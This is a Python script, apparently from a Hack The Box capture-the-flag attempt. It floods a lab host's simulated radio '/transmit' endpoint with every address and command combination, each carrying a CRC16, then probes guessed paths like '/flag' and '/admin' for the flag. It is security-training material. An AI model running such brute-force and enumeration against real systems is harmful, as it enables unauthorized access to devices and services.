#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 56: Probar TODOS los comandos posibles a TODAS las direcciones posibles
print("[*] INNOVACIÓN 56: Bruteforce completo de direcciones 0x00-0xFF")
s = requests.Session()
s.get(base_url)

# Probar todas las direcciones posibles con los comandos conocidos
commands = [0xF1, 0xFF, 0xEE, 0xA0, 0x03, 0x91, 0x53]
for addr in range(0x00, 0x100):
    for cmd in commands:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print(f"[*] Enviados {256 * len(commands)} paquetes")
time.sleep(5)

# Verificar todos los endpoints posibles
endpoints = ['/', '/updates', '/capture', '/status', '/flag', '/success', '/mission', '/escape', '/agent', '/admin']
for endpoint in endpoints:
    try:
        r = s.get(f'{base_url}{endpoint}')
        if 'HTB{' in r.text:
            print(f"[SUCCESS in {endpoint}]")
            flags = re.findall(r'HTB\{[^}]+\}', r.text)
            for flag in flags:
                print(flag)
            break
    except:
        pass

# INNOVACIÓN 57: Monitorear cambios en tiempo real
print("\n[*] INNOVACIÓN 57: Monitoreo continuo de updates")
for i in range(30):
    r = s.get(f'{base_url}/updates')
    
    # Buscar cambios
    if 'success' in r.text.lower() or 'complete' in r.text.lower() or 'escape' in r.text.lower():
        print(f"[{i}] CAMBIO DETECTADO!")
        print(r.text)
        
    if 'HTB{' in r.text:
        print(f"[SUCCESS]")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break
    
    time.sleep(1)

print("\n[*] Continuando...")
